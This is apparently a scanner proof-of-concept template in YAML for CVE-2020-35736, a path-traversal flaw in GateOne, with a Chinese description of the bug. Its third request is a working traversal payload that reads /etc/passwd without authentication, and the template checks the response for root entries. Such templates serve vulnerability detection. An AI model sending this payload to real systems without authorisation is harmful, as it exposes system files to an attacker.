name: poc-yaml-poc-yaml-gateone-unauth-file-read-cve-2020-35736
rules:
  - method: GET
    path: "/auth?next=%2F"
    follow_redirects: false
    expression: response.status == 302
  - method: GET
    path: "/"
    follow_redirects: false
    expression: r'Gate One'.bmatches(response.body)
  - method: GET
    path: "/downloads/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
    follow_redirects: true
    expression: |
      r'root:[x*]:0:0:'.bmatches(response.body)&&response.status == 200&& response.headers["Content-Type"].contains(string("text/html"))
detail:
  author: tangshoupu
  info: CVE-2020-35736 GateOne 存在路径遍历漏洞，该漏洞允许在未经身份验证的情况下使用/downloads/路径遍历，进行任意文件下载。
  links: https://github.com/liftoff/GateOne
